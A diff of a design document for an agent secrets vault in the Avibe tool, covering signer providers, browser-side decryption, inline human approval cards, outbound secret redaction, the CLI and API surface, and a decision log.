+| **Turnkey** | **AWS Nitro Enclave (TEE)** — encrypted key ciphertext in Turnkey's DB, decrypted *only inside the enclave*. **In their cloud**, not local; non-custodial via per-user sub-orgs (parent has read-only, can't sign) | Turnkey org + API key pair + org ID; each user = a sub-org | No — sub-org *creation* needs the parent API key (server-side); login + signing can be 100% client-side (passkey + `@turnkey/viem`) | passkey authenticates an "activity" request → enclave decrypts the ECDSA key inside Nitro → signs → returns sig. (Passkey doesn't sign the tx; it unlocks the enclave key.) 50–100ms |
+| **Privy** | **SSS key-sharding** (device share in browser + auth share in Privy cloud + recovery share), or newer **TEE 2-of-2** (enclave + auth share). Key assembled only briefly in iframe/enclave, never whole at rest. Part-local, part-cloud | Privy app ID | Mostly — SDK + iframe, but the auth share comes from Privy's cloud | shares combined in the isolated iframe (or Nitro enclave) → ECDSA → sig; full key never persisted |
+| **Web3Auth** | **MPC-TSS** — shares across your device + the Torus node network (default 3/5). Distributed, never whole | Dashboard project **clientId** + domain whitelist | Yes for the browser SDK (Torus handles infra, no backend required); optional `@web3auth/node-sdk` for headless | nodes produce **partial signatures** combined without ever reconstructing the key (true TSS); ~<1.2s |
+| **Lit Protocol** | **PKP** via DKG across Lit's decentralized node network, each node holds a share, >2/3 threshold. Never assembled; lives across the network | mint a PKP (on-chain) + an auth method | frontend SDK + their network (decentralized, no single vendor backend) | request → >2/3 nodes produce signature shares → combined; programmable via Lit Actions (conditional signing) |
 
-Why this is the right split (the difference is *blast radius*): a daemon-side
-KDF would put the master password — which unlocks the whole vault, including
-future secrets — into daemon memory on every approval. Browser-side keeps the
-password on the user's device; the daemon only ever sees the single value being
-delivered. And passkey PRF is *physically* a browser ceremony anyway. The
-`wrap_meta` wire format is client-unwrappable from the first migration, so there
-is nothing to re-shape later.
+Plus **account abstraction** (`aa`): ERC-4337 + Safe / ZeroDev session keys
+(ERC-7715/7710) — the owner key is any of the above, but the *agent* gets a
+time-boxed, spend-capped, revocable session key enforced **on-chain**. The
+agent-native way to grant limited authority without handing over a master key;
+needs a smart account + a bundler (Pimlico/ZeroDev), not a custody account.
+
+### 8.6 Local signer: build vs. reuse (your Q5)
+
+Neither "drop-in product" nor "build crypto from scratch." There is **no** local,
+self-hosted, agent-signing vault we'd just install (the ones that exist are
+cloud-tied or HTTP-proxy-shaped). But we don't write crypto — we assemble audited
+libraries, ~90% reuse + ~10% glue:
+
+- **Key-at-rest encrypt/decrypt** — the proven all-in-one is **ethers.js**:
+  [`Wallet.encrypt(password)`](https://docs.ethers.org/v3/api-wallet.html) writes
+  the standard **Web3 Secret Storage keystore JSON** (scrypt + AES-128-CTR + MAC,
+  the MetaMask/MEW/geth format), `Wallet.fromEncryptedJson(json, password)`
+  decrypts **in the browser** into a signer, and the `x-ethers` field even stores
+  the encrypted mnemonic so the HD seed is recoverable. This is literally
+  "encrypt the key at rest + decrypt-then-sign, fully client-side, no cloud."
+  - Decision: to keep one envelope across the whole vault (AES-GCM DEK + passkey
+    multi-wrap, same as static secrets), we wrap the raw key/mnemonic with **our**
+    envelope and use ethers/`@noble` only for the *signing* step — rather than
+    adopting the keystore's password-only scrypt format. ethers keystore stays
+    the battle-tested reference / import-export format.
+- **Signing** — `@noble/curves` (audited secp256k1) or `viem`/`ethers` (which use
+  `@noble`): EIP-155 tx, EIP-191 `personal_sign`, EIP-712 typed data; `@scure/bip39`
+  for the mnemonic.
+- **What we build** — the cross-origin iframe harness (§8.3), the approval wiring
+  (§9), and the `SignerProvider` interface (§8.1). Small, and not cryptographic.
+
+### 8.7 Passkey storage providers (your Q1)
+
+Yes — a browser passkey ceremony can invoke the platform's passkey store and
+third-party providers. For our use we need the **PRF** extension, not just
+authentication; 2026 status:
+
+| store | passkey auth | PRF for encryption |
+| --- | --- | --- |
+| **iCloud Keychain** (iOS/macOS, Safari 18+, Face/Touch ID) | ✓ | ✓ |
+| **Google Password Manager** (Android/Chrome/Edge) | ✓ | ✓ (default) |
+| **Windows Hello** | ✓ | ✓ (post Feb-2026 update) |
+| **1Password** (cross-platform credential provider) | ✓ | ✓ (ships PRF + open-sourced an E2EE helper lib) |
+| **Bitwarden / Dashlane** | ✓ | ✓ |
+| **YubiKey / roaming security key on iOS/iPadOS** | ✓ | ✗ — Apple won't pass PRF to roaming authenticators (platform gap) |
+
+So iOS/macOS and 1Password all work; the only real gap is hardware security keys
+*on Apple mobile*. PRF stays an enhancement over the password (§7.3) precisely
+because support, while good, isn't universal.
 
 ## 9. Approval flow — inline interactive card in the session
 
-**Decided: approval is web-only** (an IM account is a weaker authenticator than
-the OIDC-gated web session). Per round-2 direction, the approval is **pushed
-into the current session as a structured message and rendered inline as an
-interactive card**, rather than making the user navigate to /vaults — the user
-is already in the conversation with the agent.
-
-Codebase reality (verified) and the resulting design choice:
-
-- A `system` message *type* already exists in `core/message_dispatcher.py`, but
-  `core/message_mirror.py` **deliberately does not persist `system` messages**
-  ("init banners / status lines — noise in history"). An approval card must
-  survive reload and headless arrival and appear in history for audit, so it
-  **cannot** ride the non-persisted `system` type as-is.
-- The clean path reuses the **quick-reply rails** (the existing inline-
-  interactive precedent): persist the card as a transcript message
-  (`author='system'` for the visual treatment, a persisted `type`) carrying a
-  `content.card_type='approval'` spec + `metadata._approval_id`; render a new
-  `ApprovalCard` branch in `ChatPage.tsx`'s message switch; the user's
-  approve/deny posts out-of-band to `/api/vault/requests/{id}/approve` (carrying
-  the browser-derived material per §8.4), and the choice is recorded **set-once**
-  on the card row exactly like `quick_reply_chosen`.
-- **One required new rail**: there is no `message.updated` SSE wired into the
-  workbench today (only IM has it). We add it so the card can flip to
-  `approved`/`denied` **in place** for any viewer and after the blocked CLI
-  unblocks — a small, generally useful addition (in-place message patching).
-
-Surfaces, by where the session lives:
-
-- **Web session** → inline `ApprovalCard` in the transcript (primary).
-- **IM session** → notification + deep link to the web card (IM can't render
-  secure interactive inputs; and approval is web-only anyway).
-- **Headless** (no active session/agent-run) → the card persists; the Vaults
-  page **inbox** is the aggregate fallback surface. All three back the same
-  `vault_requests` row.
-
-Flow: agent runs `vibe vault run --env STRIPE_KEY -- ...` (protected) → daemon
-creates `access` request, CLI blocks → card pushed to the session + SSE +
-(IM) notify → user reviews delivery form (env→command / file path / decoded tx
-/ target host) and approves with password/passkey **in the browser** → §8.4
-yields the value → daemon completes the blocked `resolve` over UDS → audit →
-`message.updated` flips the card. Deny/timeout → CLI exits nonzero with a clean,
-relayable error. Standard-tier uses skip the card (silent, audited; per-secret
-`always_ask` can opt in).
+**Web-only** (IM is a weaker authenticator). Pushed into the current session as a
+structured message, rendered inline as an interactive card. Codebase reality
+(verified): a `system` message *type* exists in `core/message_dispatcher.py`, but
+`core/message_mirror.py` **deliberately does not persist `system` messages**
+(banner noise) — so the card can't ride the raw `system` type (it must survive
+reload / headless arrival / appear in history for audit). Clean path = reuse the
+**quick-reply rails**: persist the card as a transcript message (`author='system'`
+for the visual, a persisted `type`), `content.card_type='approval'` +
+`metadata._approval_id`; new `ApprovalCard` branch in `ChatPage.tsx`'s message
+switch; approve/deny posts out-of-band to `/api/vault/requests/{id}/approve`
+(carrying browser-derived material, §8.4); choice recorded **set-once** like
+`quick_reply_chosen`. One new rail: a `message.updated` SSE on the workbench (only
+IM has it today) so the card flips to approved/denied in place. Surfaces: web
+session → inline card; IM session → notify + deep link; headless → persists, Vaults
+inbox is the fallback. All back the same `vault_requests` row.
 
 ## 10. Outbound redaction (tripwire)
 
-The dispatcher (`core/message_dispatcher.py`) is the single outbound chokepoint:
-scan outgoing messages for known plaintext values (standard-tier; protected
-during an active grant window), replace with `[REDACTED:NAME]` + audit +
-warning toast. Exact-match plus base64/url-encoded variants — cheap, no
-heuristics. Turns "agent echoed the secret" from a breach into a logged
-near-miss. P0/P1.
+The dispatcher is the single outbound chokepoint: scan outgoing messages for known
+plaintext values (standard-tier; protected during an active grant), replace with
+`[REDACTED:NAME]` + audit + warning. Exact-match + base64/url variants — cheap.
+Turns "agent echoed the secret" into a logged near-miss.
 
 ## 11. API and CLI surface
 
-REST (`/api/vault/*`, existing web auth + CSRF): `GET/POST/PATCH/DELETE
-/secrets`, `GET /requests?status=pending`, `POST /requests/{id}/fulfill`
-(provision), `POST /requests/{id}/approve` (access/sign/proxy; carries
-browser-unwrapped material), `POST /requests/{id}/deny`, `GET/POST/DELETE
-/links`, `GET /audit`, `POST /keys/generate`→`/confirm` (web-only ceremony,
-mnemonic shown once between the two calls), `GET/POST /config` (password,
-machine-key mode), `GET /signers` (available provider kinds). SSE on the
-existing `/api/events`: `vault.request.new`, `vault.request.decided`,
-`vault.secrets.changed`, plus the new generic `message.updated`.
+REST (`/api/vault/*`): `GET/POST/PATCH/DELETE /secrets`, `GET /requests`,
+`POST /requests/{id}/fulfill|approve|deny`, `GET/POST/DELETE /links`, `GET /audit`,
+`POST /keys/generate`→`/confirm` (web-only ceremony, mnemonic shown once),
+`GET/POST /config`, `GET /signers`. SSE: `vault.request.new`,
+`vault.request.decided`, `vault.secrets.changed`, `message.updated`.
 
-Internal UDS (`/internal/vault/*`, daemon ⇄ CLI): `resolve`
-(`{names,mode,requester,wait}` → values; blocks on protected approval),
-`provision`, `sign` (`{key,payload,sig_type}` → blocks → signature), `fetch`
-(proxy), `requests/{id}/wait` (long-poll).
+Internal UDS (`/internal/vault/*`): `resolve`, `provision`, `sign`, `fetch`,
+`requests/{id}/wait`.
 
-CLI (`vibe vault …`): `set NAME [--protected] --stdin|--from-file f` (argv
-values rejected by design), `list [--skill S] [--json]`, `rm`, `run`, `inject`,
-`request`, `link/unlink`, `audit`, `key export/import`, `sign --key NAME
-(--eth-tx f|--message s|--typed-data f) [--out f]`, `fetch --auth NAME …`. No
-command prints a value; there is deliberately no `vibe vault get`.
+CLI (`vibe vault …`):
+
+| command | notes |
+| --- | --- |
+| `set NAME [--protected] --stdin\|--from-file f` | argv values rejected by design |
+| `list [--skill S] [--json]` / `rm NAME` | names + metadata only |
+| `run --env NAME[,N2] [--env LOCAL=NAME] [--env-skill S] -- cmd…` | M1, multi-var |
+| `export --env NAME[,N2] [--env-skill S]` | M1′, emits `export …` for `eval "$(…)"` |
+| `inject --keys A,B --out f [--format dotenv\|json\|yaml\|toml] [--ttl 10m]` / `--template t --out f` | M2, TTL opt-in/off by default |
+| `request NAME [--reason s] [--skill s] [--protected] [--wait s\|--no-wait]` | §6 |
+| `link/unlink --skill S NAME…` · `audit [--secret NAME]` · `key export/import` | |
+| `sign --key NAME (--eth-tx f\|--message s\|--typed-data f) [--out f]` · `fetch --auth NAME …` | M3/M4 |
+
+No command prints a secret value; no `vibe vault get`. (`export` prints
+`export NAME=…` for `eval` capture, not the bare value to a TTY — §5 M1′.)
 
 ## 12. End-to-end flows
 
-- **Standard / M1 (silent)**: agent → `vault run` → UDS `resolve` → daemon
-  machine-KEK unwrap → value over UDS → child env → audit. No human.
-- **Protected / M1 (approval)**: as above until daemon sees `protected` →
-  `access` request → inline card → user approves in browser (§8.4) → daemon
-  completes blocked `resolve` → child env. Deny/timeout → CLI exits 1.
-- **Dynamic ask (web)**: `$<NEW_KEY>` → SecureInputCard → save → wake-up (name
-  only) → agent proceeds.
-- **ETH sign (local signer)**: web key ceremony (mnemonic once) → agent builds
-  `tx.json` via its own RPC → `vault sign --key ETH_MAIN --eth-tx tx.json` →
-  inline approval card decodes `to/value/gas/chainId/selector` → user approves
-  → **iframe** decrypts key + signs → signature → agent broadcasts via its own
-  RPC. Private key + mnemonic never leave the iframe / the user's one-time view.
-- **ETH sign (mpc / aa)**: same request shape; `sign` routes to the provider;
-  `aa` may let the agent's pre-authorized session key sign within on-chain caps
-  without a per-tx prompt.
+Standard/M1 (silent): agent → `vault run` → UDS `resolve` → daemon machine-KEK
+unwrap → value over UDS → child env. Protected/M1 (approval): as above until
+`protected` → `access` request → inline card → browser approve+decrypt (§8.4) →
+complete blocked `resolve`. Dynamic ask: `$<NEW_KEY>` → SecureInputCard → save →
+name-only wake-up. ETH sign (local): web key ceremony (mnemonic once) → agent
+builds `tx.json` via its own RPC → `vault sign` → inline card decodes
+`to/value/gas/chainId/selector` → approve → **iframe** decrypts + signs →
+signature → agent broadcasts via its own RPC. ETH sign (mpc/aa): same request
+shape; routes to provider; `aa` session key may sign within on-chain caps with no
+per-tx prompt.
 
 ## 13. Skills integration
 
-SKILL.md frontmatter gains `secrets:` (name/required/description). Avibe reads
-skill metadata only via `askill --json` (`core/services/skills.py`) → askill
-(our repo) must parse/pass it through. Vaults page gets a per-skill view
-(✓ configured / ✗ missing + one-click fill); `vault_links` synced with
-`source=skill_meta`. Agents can `vibe vault link --skill S NAME` then `request`;
-users link/unlink in the UI. Names are the global join key.
+SKILL.md frontmatter gains `secrets:` (name/required/description); read via
+`askill --json` (askill must pass it through). Vaults page per-skill view (✓/✗ +
+one-click fill); `vault_links` synced `source=skill_meta`. Agents
+`vibe vault link --skill S NAME` then `request`; users link/unlink in UI. Names
+are the global join key.
 
 ## 14. Prior art and library survey
 
-- **Injection UX** — 1Password [`op run`/`op inject`](https://developer.1password.com/docs/cli/secret-references/),
+- **Injection** — 1Password [`op run`/`op inject`](https://developer.1password.com/docs/cli/secret-references/),
   [Infisical `infisical run`](https://infisical.com/docs/documentation/platform/secrets-mgmt/overview).
-  M1/M2 are these, vault-local.
-- **Brokered credentials** — [Arcade.dev](https://docs.arcade.dev/en/get-started/about-arcade)
-  ("LLM never sees the token", JIT user auth), [Composio](https://docs.composio.dev/docs/authentication)
-  (Connect Links ≈ our dynamic ask). Validates M4 + ask flow.
+- **Brokered creds** — [Arcade.dev](https://docs.arcade.dev/en/get-started/about-arcade),
+  [Composio](https://docs.composio.dev/docs/authentication).
 - **Vault-for-agents OSS** — [Infisical agent-vault](https://github.com/Infisical/agent-vault)
-  (MIT Go; MITM proxy + dummy-placeholder-at-egress; egress allowlists;
-  "Preview") — P3 transparent-proxy candidate; Agentic Vault (MCP, per-secret
-  allowlists, AGPL); Axis (master key in OS keychain). None has our IM surface /
-  inline approvals / skills linkage.
-- **In-browser signing** — [`@noble/curves`](https://paulmillr.com/noble/)
-  (audited secp256k1; `viem` uses it internally), [`viem` `toAccount`](https://viem.sh/docs/accounts/local/toAccount)
-  (custom account → proxy to iframe), cross-origin iframe isolation +
-  `COOP`/`COEP` ([MDN credentialless](https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless)).
+  (MIT Go MITM proxy; "Preview"; P3 transparent-proxy candidate); Agentic Vault;
+  Axis. None has our IM surface / inline approvals / skills linkage.
+- **In-browser signing + keystore** — [`@noble/curves`](https://paulmillr.com/noble/),
+  [`viem` `toAccount`](https://viem.sh/docs/accounts/local/toAccount),
+  [ethers.js keystore](https://docs.ethers.org/v3/api-wallet.html) (Web3 Secret
+  Storage, the encrypt+decrypt+sign all-in-one), cross-origin iframe + COOP/COEP
+  ([MDN](https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless)).
 - **Embedded-wallet self-custody** — [Privy](https://privy.io/blog/how-privy-embedded-wallets-work)
-  (SSS key-sharding + iframe, now TEE 2-of-2; Privy→Stripe 2025); Magic, Dynamic
-  (→Fireblocks) — the iframe-isolation reference for `local`.
-- **MPC / threshold custody** (the `mpc:<provider>` plug-ins):
-  [Web3Auth](https://web3auth.io/docs/sdk/mpc-core-kit/mpc-core-kit-js)
-  (MPC-TSS + social login; →Consensys 2025; ~<1.2s sign),
-  [Lit Protocol](https://developer.litprotocol.com/user-wallets/pkps/overview)
-  (PKPs, DKG threshold + programmable Lit Actions; most decentralized),
-  [Turnkey](https://www.turnkey.com/solutions/ai-agents) (TEE/Nitro, 50–100ms,
-  policy engine). Trade-off to weigh: MPC providers mean cloud accounts /
-  per-signature pricing / vendor risk — they cut against local-first, so they
-  stay **opt-in**, never the default.
-- **Account abstraction / session keys** (the `aa` plug-in) — ERC-4337 + Safe /
-  [ZeroDev](https://github.com/coinbase/agentkit) session-key SDK + Pimlico;
-  ERC-7715/7710 standardize scoped, redeemable, spend-capped grants
-  ([account abstraction explained](https://eco.com/support/en/articles/15254036-what-is-erc-4337-account-abstraction-explained-2026)).
-  The agent-native way to give chain-enforced limited authority instead of a
-  master key.
-- **Passkey-derived encryption** — [WebAuthn PRF](https://developers.yubico.com/WebAuthn/Concepts/PRF_Extension/),
-  [Bitwarden passkey unlock](https://bitwarden.com/blog/prf-webauthn-and-its-role-in-passkeys/);
-  2026 status per [Corbado](https://www.corbado.com/blog/passkeys-prf-webauthn):
-  enhancement over password, multi-wrap DEK.
-
-Why not embed a vault wholesale: Infisical proper is Postgres+Redis+Node (absurd
-for a personal local-first tool); agent-vault is proxy-shaped, "Preview", no
-human-approval loop. The product surface we need (Vaults page, inline cards,
-skills linkage, dynamic ask) is Avibe-native regardless. Build the thin store +
-signer abstraction on audited primitives; integrate (don't build) MPC/AA custody
-behind it.
+  (SSS + iframe / TEE 2-of-2; →Stripe), Magic, Dynamic (→Fireblocks).
+- **MPC / threshold** — [Web3Auth](https://web3auth.io/docs/sdk/mpc-core-kit/mpc-core-kit-js)
+  (MPC-TSS + social; →Consensys), [Lit](https://developer.litprotocol.com/user-wallets/pkps/overview)
+  (DKG + Lit Actions; most decentralized), [Turnkey](https://docs.turnkey.com/embedded-wallets/sub-organizations-as-wallets)
+  (Nitro TEE; 50–100ms; policy engine). All require an account + put the key in
+  their cloud/network — opt-in, never default.
+- **Account abstraction / session keys** — ERC-4337 + Safe / ZeroDev + Pimlico;
+  ERC-7715/7710 ([explainer](https://eco.com/support/en/articles/15254036-what-is-erc-4337-account-abstraction-explained-2026)).
+- **Passkey-derived encryption** — [WebAuthn PRF](https://developers.yubico.com/WebAuthn/Concepts/PRF_Extension/Developers_Guide_to_PRF.html),
+  [1Password PRF + open-source lib](https://1password.com/blog/encrypt-data-saved-passkeys),
+  [Bitwarden](https://bitwarden.com/blog/prf-webauthn-and-its-role-in-passkeys/);
+  [Corbado 2026 status](https://www.corbado.com/blog/passkeys-prf-webauthn); the
+  [data-loss warning](https://lilting.ch/en/articles/passkeys-prf-extension-encryption-risk)
+  (Tim Cappalli) → PRF as enhancement, password as recovery root.
 
 ## 15. Architecture frozen up front, delivery incremental
 
-Per round-2 direction: **lock the architecture now so nothing gets ripped out
-and re-migrated.** The data model, the `wrap_meta` wire format (client-
-unwrappable), the daemon/browser decryption split (§8.4), the `SignerProvider`
-interface, and the inline-card message shape are **final from the first commit**.
-Delivery still lands as focused commits on that frozen shape (one branch, one
-PR at a checkpoint) — but no commit invalidates an earlier one, and there is no
-"daemon-side now, browser-side later" rewrite. "No phasing" = no throwaway
-architecture, not "ship everything in one drop."
-
-Capability rollout on the frozen architecture (order, not re-architecture):
-
-1. Store + envelope (both tiers' formats) + Vaults CRUD + `data query` denylist.
-2. M1/M2 delivery + dynamic ask (`$<NAME>` + SecureInputCard + IM deep link).
-3. Protected tier + browser-side decryption + inline ApprovalCard +
-   `message.updated` SSE + outbound redaction.
-4. Skills `secrets:` linkage + keychain mode + `key export/import`.
-5. `local` signer (iframe isolation, BIP-39 ceremony, EIP-155/191/712 decoded
-   approvals).
-6. `mpc` / `aa` / `external` signer plug-ins; `vault fetch` broker.
-7. Transparent proxy option; migrate platform/provider config secrets into the
-   vault (closes the #555 arc); signer policy engine; session-scoped grants.
+Lock the architecture now (data model, `wrap_meta` wire format, daemon/browser
+decryption split, `SignerProvider` interface, inline-card message shape are final
+from commit 1); deliver as focused commits with no rip-and-replace. Capability
+order: (1) store + envelope + CRUD + `data query` denylist; (2) M1/M1′/M2 +
+dynamic ask; (3) protected tier + browser decryption + inline ApprovalCard +
+`message.updated` + redaction; (4) skills linkage + keychain + key export/import;
+(5) `local` signer (iframe, BIP-39 ceremony, EIP-155/191/712 decoded approvals);
+(6) `mpc`/`aa`/`external` plug-ins + `fetch` broker; (7) transparent proxy +
+config-secret migration (closes #555) + signer policy engine + session grants.
 
 ## 16. Decision log
 
-Locked, round 1 (2026-06-12): approval web-only; signer direct to secp256k1/ETH
-on open-source stack; phasing structure approved.
-
-Locked, round 2 (2026-06-13):
-1. Protected-tier decryption is **browser-side from the first commit**; standard
-   tier stays daemon-side permanently (tier split, not a migration) (§8.4).
-2. **Architecture frozen up front, delivered incrementally** — no rip-and-
-   replace (§15).
-3. Signing is a **pluggable `SignerProvider`**: `local` (iframe-isolated
-   software key) default; `mpc`/`aa`/`external` opt-in plug-ins (§8).
-4. Local keypair material (mnemonic + private key) is envelope-encrypted under
-   the protected tier; signing happens **in the isolated browser iframe**, only
-   the signature leaves (§8.2/8.3).
-5. Inline **ApprovalCard** in the session via a persisted structured message +
-   quick-reply rails + new `message.updated` SSE (not the non-persisted `system`
-   type) (§9).
-
-Proposed in v3, awaiting confirm:
-6. `local` is the **default** signer (local-first); MPC stays opt-in given its
-   cloud-account / pricing / vendor-lock-in cost. Agree?
-7. Of the MPC plug-ins, integrate which **first** — Lit (most decentralized,
-   local-aligned), Turnkey (fastest, policy engine), or Web3Auth (social-login)?
-   Or defer all until a concrete unattended-signing need appears?
-8. `argon2` WASM (`hash-wasm`) browser-side for the password KDF — OK as the one
-   new browser crypto dep?
+Round 1 (06-12): approval web-only; signer → secp256k1/ETH; phasing OK.
+Round 2 (06-13): protected decryption browser-side from commit 1, standard daemon
+permanently (tier split, not migration); architecture frozen, delivery
+incremental; pluggable `SignerProvider` (`local` default, mpc/aa/external opt-in);
+local keypair envelope-encrypted, sign in iframe; inline ApprovalCard via
+quick-reply rails + `message.updated`.
+Round 3 (06-14):
+1. Passkey encryption = WebAuthn PRF + HKDF → KEK (mature; multi-wrap with
+   password as recovery root; PRF never sole factor — data-loss warning) (§7.3).
+2. `local` signer = assemble audited libs (ethers keystore / `@noble` / viem +
+   iframe harness), not build crypto, not a drop-in product (§8.6).
+3. Third-party signers all need an account + cloud custody → confirmed opt-in,
+   `local` is default (§8.5).
+4. `run` is multi-var and cannot export to the parent shell (OS guarantee +
+   non-persistent agent shell) — that's the security feature; add `export` (M1′)
+   for many-commands-in-one-shell via `eval "$(…)"` (§5).
+5. `inject` gains dotenv/json/yaml/toml; TTL becomes opt-in (off by default) (§5).
 
 ## 17. Open questions
 
 1. Reveal-on-click for standard-tier values in the UI: allow or never?
-2. `request --wait` / protected-access / sign approval timeout (proposal:
-   10 min) and how a denied/expired wait reads to the agent.
-3. Secret scope: instance-global (env model, recommended) — any per-project
-   need to shape the schema now?
-4. askill frontmatter extension — confirm we own it + file the issue.
+2. `request --wait` / approval timeout default (proposal: 10 min) and how a
+   denied/expired wait reads to the agent.
+3. Secret scope: instance-global (env model) — any per-project need now?
+4. askill `secrets:` frontmatter — confirm we own it + file the issue.
 5. ETH preview depth: selector + raw calldata to start, or ABI-decode +
-   dangerous-selector warnings (`approve`, `setApprovalForAll`) from day one?
-6. `aa` session keys — is "agent gets a chain-capped session key" a near-term
-   want (it's the strongest agent-autonomy story), or later?
+   dangerous-selector warnings (`approve`, `setApprovalForAll`) day one?
+6. `aa` session keys — near-term (strongest agent-autonomy story) or later?
+7. Default passkey support on/off at launch, or password-only first with passkey
+   as a fast-follow (given the iOS-roaming-key gap and the data-loss caveat)?
